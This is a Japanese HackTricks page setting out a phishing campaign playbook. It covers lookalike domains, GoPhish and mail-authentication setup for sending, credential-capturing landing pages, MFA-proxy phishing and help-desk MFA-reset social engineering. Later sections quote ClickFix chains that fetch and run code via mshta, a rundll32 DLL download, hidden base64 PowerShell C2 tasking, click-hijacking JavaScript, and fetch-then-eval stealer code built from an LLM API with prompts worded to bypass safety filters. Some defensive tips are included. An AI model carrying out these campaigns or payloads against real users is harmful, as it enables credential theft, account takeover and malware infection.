# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. 被害者を Recon する
1. **victim domain** を選択する。
2. 基本的な Web enumeration を実行して、被害者が使用している**ログインポータルを検索**し、どれを**偽装する**か**決定**する。
3. **OSINT** を使用して**メールアドレスを見つける**。
2. 環境を準備する
1. phishing assessment に使用する**ドメインを購入**する
2. **email service** に関連するレコード（SPF、DMARC、DKIM、rDNS）を**設定**する
3. **gophish** を使用して VPS を設定する
3. campaign を準備する
1. **email template** を準備する
2. 認証情報を盗むための**Web page**を準備する
4. campaign を開始する！

## 類似したドメイン名を生成する、または信頼されたドメインを購入する

### Domain Name Variation Techniques

- **Keyword**: ドメイン名に元のドメインの重要な**keyword**が**含まれる**（例: zelster.com-management.com）。<sup>[[1]](#references)</sup>
- **hypened subdomain**: subdomain の**dot を hyphen に変更**する（例: www-zelster.com）。
- **New TLD**: **新しい TLD**を使用した同じドメイン（例: zelster.org）
- **Homoglyph**: ドメイン名の文字を、**見た目が似ている文字**に**置き換える**（例: zelfser.com）。


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** ドメイン名内の**2つの文字を入れ替える**（例: zelsetr.com）。
- **Singularization/Pluralization**: ドメイン名の末尾に「s」を追加または削除する（例: zeltsers.com）。
- **Omission**: ドメイン名から文字を1つ**削除する**（例: zelser.com）。
- **Repetition:** 文字の1つを**繰り返す**（例: zeltsser.com）。
- **Replacement**: Homoglyph に似ているが、より stealthy ではない。ドメイン名の文字を1つ置き換える。たとえば、キーボード上で元の文字の近くにある文字に置き換える（例: zektser.com）。
- **Subdomained**: ドメイン名の内部に**dot**を入れる（例: ze.lster.com）。
- **Insertion**: ドメイン名に文字を1つ**挿入する**（例: zerltser.com）。
- **Missing dot**: TLD をドメイン名に追加する（例: zelstercom.com）

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

太陽フレア、宇宙線、ハードウェアエラーなどのさまざまな要因により、保存中または通信中のビットの一部が**自動的に反転する可能性**がある。

この概念を**DNS requests に適用すると**、**DNS server が受信する domain**が、最初に要求された domain と同じでない可能性がある。

たとえば、ドメイン「windows.com」の1ビットを変更すると、「windnws.com」に変わる可能性がある。

攻撃者は、被害者のドメインに類似した**複数の bit-flipping domains を登録**することで、これを**悪用する可能性**がある。その目的は、正規ユーザーを自分たちの infrastructure にリダイレクトすることである。

詳しくは [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)<sup>[[9]](#references)</sup> を参照。

### 信頼されたドメインを購入する

[https://www.expireddomains.net/](https://www.expireddomains.net) で、使用できそうな expired domain を検索できる。\
購入する expired domain が**すでに良好な SEO を持っている**ことを確認するには、次のサイトでどのように分類されているかを検索する。

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## メールアドレスの発見

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester)（100% free）
- [https://phonebook.cz/](https://phonebook.cz)（100% free）
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

有効なメールアドレスをさらに**発見**したり、すでに発見したものを**検証**したりするには、被害者の SMTP servers に対して brute-force できるか確認できる。[こちらでメールアドレスの検証・発見方法を学ぶ](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
さらに、ユーザーが**メールにアクセスするために Web portal を使用している場合**は、**username brute force** に対して脆弱かどうかを確認し、可能であればその脆弱性を exploit することも忘れないこと。

## GoPhish の設定

### インストール

[https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) からダウンロードできる。

`/opt/gophish` 内にダウンロードして decompress し、`/opt/gophish/gophish` を実行する\
出力に、port 3333 の admin user 用 password が表示される。そのため、その port にアクセスし、それらの credentials を使用して admin password を変更する必要がある。その port を local に tunnel する必要がある場合がある:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 設定

**TLS 証明書の設定**

この手順を開始する前に、使用する **domain を購入済み**であり、**gophish** を設定する **VPS の IP** を **domain が指している**必要があります。
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

インストールを開始します: `apt-get install postfix`

次のファイルにドメインを追加します:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** 内の次の変数の値も変更します:

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最後に、**`/etc/hostname`** と **`/etc/mailname`** のファイルをドメイン名に変更し、**VPSを再起動します。**

次に、`mail.<domain>` の **DNS A record** を作成してVPSの **IP address** を指定し、`mail.<domain>` を指す **DNS MX record** を作成します。

それでは、メールの送信をテストします:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophishの設定**

gophishの実行を停止して、設定しましょう。\
`/opt/gophish/config.json`を以下のように変更します（httpsの使用に注意してください）。
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service を設定**

gophish service を作成して自動的に起動できるようにし、service として管理するには、以下の内容で `/etc/init.d/gophish` ファイルを作成します：
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
以下を実行してサービスの設定を完了し、動作を確認します:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## メールサーバーとドメインの設定

### 待機して正当性を保つ

ドメインが古いほど、spamとして検出される可能性は低くなります。そのため、phishing assessmentの前にできるだけ長く（少なくとも1週間）待つ必要があります。さらに、評判の良い分野に関するページを設置すると、より良いreputationを得られます。

1週間待つ必要がある場合でも、設定作業は今すべて完了できます。

### Reverse DNS (rDNS) recordの設定

VPSのIPアドレスをドメイン名に解決するrDNS (PTR) recordを設定します。

### Sender Policy Framework (SPF) Record

**新しいドメインにSPF recordを設定する必要があります**。SPF recordについて知らない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

[https://www.spfwizard.net/](https://www.spfwizard.net)を使用してSPF policyを生成できます（VPS machineのIPを使用してください）。

![phishing domain用のSPF recordを生成するSPF Wizard form](<../../images/image (1037).png>)

これはドメイン内のTXT recordに設定する必要がある内容です：
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### ドメインベースの Message Authentication, Reporting & Conformance (DMARC) レコード

**新しいドメイン用に DMARC レコードを設定する必要があります**。DMARC レコードについて知らない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

ホスト名 `_dmarc.<domain>` を指定し、次の内容を設定した新しい DNS TXT レコードを作成する必要があります:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

**新しいドメイン用に DKIM を設定する必要があります**。DMARC record について知らない場合は、[**このページを読んでください**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

このチュートリアルは以下を基にしています: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)<sup>[[4]](#references)</sup>

> [!TIP]
> DKIM key が生成する両方の B64 値を連結する必要があります:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### email configuration score をテストする

[https://www.mail-tester.com/](https://www.mail-tester.com) を使用してテストできます\
ページにアクセスし、表示されたアドレスに email を送信するだけです:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
また、`check-auth@verifier.port25.com` にメールを送信して**応答を読む**ことで、**メール設定を確認**できます（このためにはポート **25** を**開放**し、root としてメールを送信した場合はファイル _/var/mail/root_ で応答を確認する必要があります）。\
すべてのテストに合格していることを確認してください：
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
**自分が管理する Gmail にメッセージを送信**し、Gmail の受信トレイで**メールのヘッダー**を確認する方法もあります。`Authentication-Results` ヘッダーフィールドに `dkim=pass` が含まれているはずです。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Spamhausブラックリストからの削除

[www.mail-tester.com](https://www.mail-tester.com) のページで、あなたのドメインがspamhausによってブロックされているか確認できます。ドメイン/IPの削除は、[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/) からリクエストできます。

### Microsoftブラックリストからの削除

ドメイン/IPの削除は、[https://sender.office.com/](https://sender.office.com) からリクエストできます。

## GoPhishキャンペーンの作成と起動

### Sending Profile

- 送信者プロファイルを識別できるように**名前**を設定する
- phishingメールの送信元にするアカウントを決める。候補: _noreply、support、servicedesk、salesforce..._
- usernameとpasswordは空欄のままでも構いませんが、**Ignore Certificate Errors**に必ずチェックを入れてください

![GoPhishキャンペーンの作成と起動 - Sending Profile: usernameとpasswordは空欄のままでも構いませんが、Ignore Certificate Errorsに必ずチェックを入れてください](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> すべてが正常に動作することを確認するため、**Send Test Email**機能を使用してテストすることを推奨します。\
> テストによってブラックリストに登録されるのを避けるため、テストメールは**10min mail addresses**に送信することを推奨します。

### Email Template

- テンプレートを識別できるように**名前**を設定する
- 次に**subject**を記述する（不自然なものではなく、通常のメールで読むことが想定される内容にする）
- **Add Tracking Image**にチェックが入っていることを確認する
- **email template**を記述する（次の例のように変数を使用できます）:
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
メールの**信頼性を高めるために**、クライアントからのメールに含まれる署名を使用することを推奨します。提案：

- **存在しないアドレス**にメールを送り、返信に署名が含まれているか確認する。
- info@ex.com、press@ex.com、public@ex.com のような**公開メールアドレス**を探し、メールを送って返信を待つ。
- **発見した有効な**メールアドレスに連絡し、返信を待つ。

![送信プロファイル - メールテンプレート：発見した有効なメールアドレスに連絡し、返信を待つ](<../../images/image (80).png>)

> [!TIP]
> Email Template では、**送信するファイルを添付する**こともできます。特別に細工したファイル／ドキュメントを使用して NTLM challenge も盗みたい場合は、[**このページを読んでください**](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### Landing Page

- **名前**を入力する
- Web ページの**HTML code**を入力する。Web ページを**import**できることに注意。
- **Capture Submitted Data** と **Capture Passwords** にチェックを入れる
- **redirection**を設定する

![メールテンプレート - Landing Page：Capture Submitted Data と Capture Passwords にチェックを入れる](<../../images/image (826).png>)

> [!TIP]
> 通常は、ページの HTML code を変更し、ローカル環境（Apache server などを使用）で、**結果に納得できるまで**テストする必要があります。その後、その HTML code をボックスに入力します。\
> HTML で**静的リソース**（CSS や JS ページなど）を使用する必要がある場合は、_**/opt/gophish/static/endpoint**_ に保存し、_**/static/\<filename>**_ からアクセスできます。

> [!TIP]
> redirection では、ユーザーを被害者の**正規のメイン Web ページ**にリダイレクトするか、例えば _/static/migration.html_ にリダイレクトし、**spinning wheel (**[**https://loading.io/**](https://loading.io)**) を 5 秒間表示してから、処理が成功したことを示す**ことができます。

### Users & Groups

- 名前を設定する
- **データをimport**する（この例の template を使用するには、各ユーザーの firstname、last name、email address が必要です）

![Landing Page - Users & Groups：データをimportする（この例の template を使用するには、各ユーザーの firstname、last name、email address が必要）](<../../images/image (163).png>)

### Campaign

最後に、名前、email template、landing page、URL、sending profile、group を選択して campaign を作成します。URL は被害者に送信されるリンクになることに注意してください。

**Sending Profile では、最終的な phishing email がどのように見えるかを確認するため、テストメールを送信できます**：

![Users & Groups - Campaign：Sending Profile では、最終的な phishing email がどのように見えるかを確認するため、テストメールを送信できる](<../../images/image (192).png>)

> [!TIP]
> テストによって blacklist に登録されるのを避けるため、**テストメールは 10min mails のアドレスに送信する**ことを推奨します。

すべての準備ができたら、campaign を開始します！

## Website Cloning

何らかの理由で Web サイトを clone したい場合は、次のページを確認してください：


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

一部の phishing assessment（主に Red Teams）では、**何らかの backdoor**（C2、または authentication を trigger するだけのもの）を含むファイルも**送信したい**場合があります。\
いくつかの例については、次のページを確認してください：


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

前述の attack は、実際の Web サイトを偽装し、ユーザーが入力した情報を収集するという点で非常に巧妙です。しかし、ユーザーが正しい password を入力しなかった場合、または偽装した application が 2FA で設定されている場合、**この情報だけでは、だまされたユーザーになりすますことはできません**。

ここで [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper)、[**muraena**](https://github.com/muraenateam/muraena) のような tools が役立ちます。これらの tools を使用すると、MitM のような attack を生成できます。基本的に、attack は次のように動作します：

1. 実際の Web ページの **login form になりすます**。
2. ユーザーが**credentials**を fake page に**送信**し、tool はそれらを実際の Web ページに送信して、**credentials が有効か確認する**。
3. account が **2FA** で設定されている場合、MitM page はそれを要求し、**ユーザーが入力すると**、tool は実際の Web ページに送信する。
4. ユーザーが authenticated になると、tool が MitM を実行している間のすべての interaction について、攻撃者は**credentials、2FA、cookie、およびあらゆる情報を取得**できます。

### Via VNC

元の Web サイトと同じ外観の**malicious page に被害者を誘導する**代わりに、実際の Web ページに接続された browser を持つ **VNC session** に誘導したらどうなるでしょうか？被害者の操作を確認し、password、使用された MFA、cookies などを盗むことができます。\
これは [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)<sup>[[3]](#references)</sup> で実行できます。

## Detecting the detection

自分が発見されたかどうかを知る最良の方法の 1 つは、**自分の domain を blacklist 内で検索すること**です。登録されていた場合、何らかの方法で自分の domain が suspicious として検出されたことになります。\
domain が blacklist に登録されているか確認する簡単な方法の 1 つは、[https://malwareworld.com/](https://malwareworld.com) を使用することです。

ただし、被害者が**実環境で suspicious な phishing activity を積極的に探しているか**を知る方法は、ほかにもあります。次で説明しています：


{{#ref}}
detecting-phising.md
{{#endref}}

被害者の domain と**非常によく似た名前の domain を購入**したり、あなたが管理する domain の**subdomain**に、被害者の domain の**keyword**を含む**certificate を生成**したりできます。被害者がそれらに対して何らかの **DNS または HTTP interaction** を実行した場合、被害者が suspicious domain を**積極的に探している**ことがわかるため、非常に stealthy になる必要があります。<sup>[[2]](#references)</sup>

### Evaluate the phishing

[**Phishious** ](https://github.com/Rices/Phishious)を使用して、email が spam folder に入るのか、blocked されるのか、または成功するのかを評価します。

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets は email lure を完全に省略し、**MFA を無効化するために service-desk / identity-recovery workflow を直接標的にする**ケースが増えています。この attack は完全な "living-off-the-land" です。operator が有効な credentials を取得すると、組み込みの admin tooling を使用して pivot します。malware は必要ありません。<sup>[[5]](#references)</sup>

### Attack flow
1. 被害者を Recon する
* LinkedIn、data breach、public GitHub などから個人情報および corporate details を収集する。
* 高価値な identity（executives、IT、finance）を特定し、password / MFA reset に関する**正確な help-desk process**を列挙する。
2. Real-time social engineering
* target になりすまして help-desk に phone、Teams、または chat で連絡する（多くの場合、**spoofed caller-ID** または **cloned voice** を使用）。
* 事前に収集した PII を提示し、knowledge-based verification を通過する。
* agent を説得して、**MFA secret を reset**するか、登録済み mobile number の **SIM-swap** を実行させる。
3. Immediate post-access actions（実際のケースでは 60 分以内）
* 任意の Web SSO portal を通じて foothold を確立する。
* built-ins を使用して AD / AzureAD を列挙する（binaries は drop しない）：
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* 環境ですでに whitelist されている **WMI**、**PsExec**、または正規の **RMM** agents を使用して lateral movement を行う。

### Detection & Mitigation
* help-desk identity recovery を**privileged operation**として扱い、step-up auth と manager approval を必須にする。
* **Identity Threat Detection & Response (ITDR)** / **UEBA** rules を deploy し、次のイベントで alert を発生させる：
* MFA method の変更 + new device / geo からの authentication。
* 同一 principal の直後の elevation（user-→-admin）。
* help-desk calls を記録し、reset の前に**すでに登録された番号への call-back**を必須にする。
* **Just-In-Time (JIT) / Privileged Access** を実装し、新たに reset された account が high-privilege token を自動的に継承しないようにする。

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews は、mass attack によって high-touch ops のコストを相殺します。これらの attack は、**search engines と ad networks を delivery channel に変えます**。<sup>[[5]](#references)</sup>

1. **SEO poisoning / malvertising** により、`chromium-update[.]site` のような fake result を search ads の最上部に表示させる。
2. 被害者が小さな **first-stage loader**（多くの場合 JS/HTA/ISO）を download する。Unit 42 が確認した例：
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. loader は browser cookies と credential DBs を exfiltrate し、その後、deploy する対象を *realtime* に決定する **silent loader** を取得する：
* RAT（例：AsyncRAT、RustDesk）
* ransomware / wiper
* persistence component（registry Run key + scheduled task）

### Hardening tips
* newly-registered domains を block し、e-mail だけでなく **search-ads** にも **Advanced DNS / URL Filtering** を適用する。
* software installation を signed MSI / Store packages に制限し、policy により `HTA`、`ISO`、`VBS` の実行を deny する。
* browser が installer を開いた際の child process を監視する：
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* first-stage loader によって頻繁に悪用される LOLBins（例：`regsvr32`、`curl`、`mshta`）を hunt する。

### Download-button click hijacking with TDS handoff
一部の fake software portal は、表示される download の `href` を**実際の GitHub/release URL**にしたまま、JavaScript によってユーザーの**最初の interaction**を hijack し、代わりに被害者を **Traffic Distribution System (TDS)** chain に送ります。<sup>[[8]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
主な特徴:
- hook は通常、`document` 上の **capture phase**（`true`）で実行されるため、サイト側の handler より先に発火します。
- Chrome では、有効な **user gesture** に紐づけて redirect を実行し、popup blocker の回避率を高めるため、`click` ではなく `mousedown` が使われることがよくあります。
- 一部の variant では、`about:blank` を先に開くか、`<a target="_blank">` の click を合成し、後から TDS URL を割り当てます。
- Browser 側の上限値は通常 `localStorage` に保存されるため、**first click** は malware に到達し、refresh や retry では無害に見える表示リンクへフォールバックすることがあります。
- TDS は referrer、entry domain、GEO、browser/device fingerprint、VPN/datacenter チェック、click context、session ごとの counter で制御できるため、analyst による replay の結果が一定しないことがあります。

Defender 向けのアイデア:
- **表示された** `href` と、click 時に生成される **実際の** navigation target を比較します。
- `window.open`、`about:blank`、または synthetic anchor click の周辺で、`preventDefault()` と `stopImmediatePropagation()` の両方を呼び出す `document.addEventListener(..., true)` handler を探します。
- 新規登録された software-download domain の複数が、同じ CloudFront/JS stage を読み込んでいる場合、SEO-poisoning/TDS パターンを示す高シグナルとして扱います。

### 偽の verification page + archive に見せかけた LOLBAS fetch による ClickFix
一部の TDS branch は、被害者に次のような信頼された Windows binary を実行するよう指示する偽の verification page（Cloudflare/IUAM 風）で終わります。<sup>[[8]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` は、URL が `.7z` archive を装っている場合でも、response の**先頭にある HTA/VBScript を実行**します。追加された archive データは、純粋な囮である可能性があります。
- 後続ステージでは、file type についても偽装が続くことが多く（PowerShell に `.rtf`、Python に `.asar`、padding された binary を含む ZIP など）、その後 **manual PE mapping / in-memory execution** に切り替わります。
- これらの chain に対応する場合、**最初の成功実行時点から network + memory を保持**してください。後続の replay では、無害な installer/SFX path しか表示されないか、payload/key release が元の TDS session に binding されているため失敗する可能性があります。

### ClickFix DLL delivery tradecraft (偽 CERT update)
* Lure: **Update** button を表示する、national CERT advisory の clone。button を押すと、step-by-step の「fix」instructions が表示されます。Victim には、DLL を download して `rundll32` 経由で実行する batch を実行させます。<sup>[[8]](#references)</sup>
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` は payload を `%TEMP%` に drop し、短い sleep によって network jitter を隠します。その後、`rundll32` が exported entrypoint（`notepad`）を呼び出します。
* DLL は host identity を beacon 送信し、数分おきに C2 を polling します。Remote tasking は **base64-encoded PowerShell** として到着し、policy bypass 付きで hidden 実行されます:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* これにより C2 の柔軟性が維持されます（server は DLL を更新せずに task を swap できます）。また console window も隠されます。`-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` を組み合わせて使用する、`rundll32.exe` の child である PowerShell を hunt してください。
* Defenders は、`...page.php?tynor=<COMPUTER>sss<USER>` 形式の HTTP(S) callback と、DLL load 後の 5 分間隔の polling を確認できます。

---

## AI-Enhanced Phishing Operations
Attackers は現在、**LLM & voice-clone APIs** を chain して、完全に personalised された lure と real-time interaction を実現しています。

| Layer | Threat actor による使用例 |
|-------|-------------|
|Automation|ランダム化された wording と tracking links を使用して、100 k 通を超える email / SMS を generate & send。|
|Generative AI|public M&A を参照する *one-off* email や、social media 上の inside jokes を生成。callback scam では deep-fake CEO voice を使用。|
|Agentic AI|domain を自律的に register し、open-source intel を scrape し、victim が click したものの creds を submit しなかった場合に next-stage mail を作成。|

**Defence:**
• ARC/DKIM anomalies を通じて、untrusted automation から送信された message を強調する **dynamic banners** を追加。
• high-risk な phone request には **voice-biometric challenge phrases** を導入。
• awareness programme で AI-generated lure を継続的に simulate する — static template は obsolete です。

こちらも参照 — credential phishing における agentic browsing abuse:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

こちらも参照 — secrets inventory と detection を目的とした、local CLI tools および MCP の AI agent abuse:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers は、**trusted LLM API** に JavaScript を要求し、その後 browser 内で実行することで、無害に見える HTML を配布し、**stealer を runtime で generate** できます（例: `eval` または dynamic `<script>`）。<sup>[[7]](#references)</sup>

1. **Prompt-as-obfuscation:** exfil URL/Base64 strings を prompt に encode し、safety filter を bypass して hallucination を減らすために wording を反復します。
2. **Client-side API call:** load 時に、JS が public LLM（Gemini/DeepSeek/etc.）または CDN proxy を call します。static HTML には prompt/API call だけが存在します。
3. **Assemble & exec:** response を concatenate して実行します（visit ごとに polymorphic）:
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 生成された code が lure をパーソナライズし（例: LogoKit token parsing）、認証情報を prompt-hidden endpoint に POST する。

**Evasion traits**
- Traffic は well-known LLM domains または信頼性の高い CDN proxies に到達し、backend へ WebSockets 経由で接続する場合もある。
- Static payload は存在せず、malicious JS は render 後にのみ存在する。
- Non-deterministic generations により、セッションごとに **unique stealers** が生成される。

**Detection ideas**
- JS enabled の sandboxes を実行し、**LLM responses を source とする runtime `eval`/dynamic script creation** を検出する。
- LLM APIs への front-end POST の直後に、返された text に対して `eval`/`Function` が実行されるパターンを探索する。
- client traffic 内の未承認 LLM domains と、その後に続く credential POSTs を alert する。

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
classic push-bombing に加えて、operators は help-desk call 中に **new MFA registration を強制**し、ユーザーの既存 token を無効化する。その後の login prompt は victim には正規のものに見える。
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
同一の IP から **`deleteMFA` + `addMFA`** が数分以内に発生した AzureAD/AWS/Okta のイベントを監視します。



## Clipboard Hijacking / Pastejacking

攻撃者は、侵害された Web ページや typosquatting された Web ページから被害者のクリップボードへ悪意のあるコマンドを密かにコピーし、**Win + R**、**Win + X**、またはターミナルウィンドウ内に貼り付けるようユーザーを誘導できます。これにより、ダウンロードや添付ファイルなしで任意のコードを実行させます。


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp の QR ソーシャルエンジニアリングによるデバイスリンク乗っ取り
* 誘導ページ（例：偽の省庁/CERT「channel」）に WhatsApp Web/Desktop の QR を表示し、被害者にスキャンするよう指示します。これにより、攻撃者が **linked device** として密かに追加されます。<sup>[[10]](#references)</sup>
* 攻撃者は直ちにチャットや連絡先を閲覧できるようになり、セッションが削除されるまでその状態が続きます。被害者には後から「new device linked」通知が表示される場合があります。defender は、信頼できない QR ページへのアクセス直後に発生した予期しない device-link イベントを hunt できます。

### crawler/sandbox を回避するためのモバイル制限付き phishing
Operators は、desktop crawler が最終ページへ到達しないよう、単純な device check の背後に phishing flow を置くケースを増やしています。一般的なパターンでは、touch 対応 DOM かどうかを小さな script で検査し、その結果を server endpoint へ post します。non-mobile client には HTTP 500（または空白ページ）を返し、mobile user には完全な flow を提供します。<sup>[[6]](#references)</sup>

最小限の client snippet（典型的な logic）：
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` のロジック（簡略版）:
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
サーバーでよく観察される挙動:
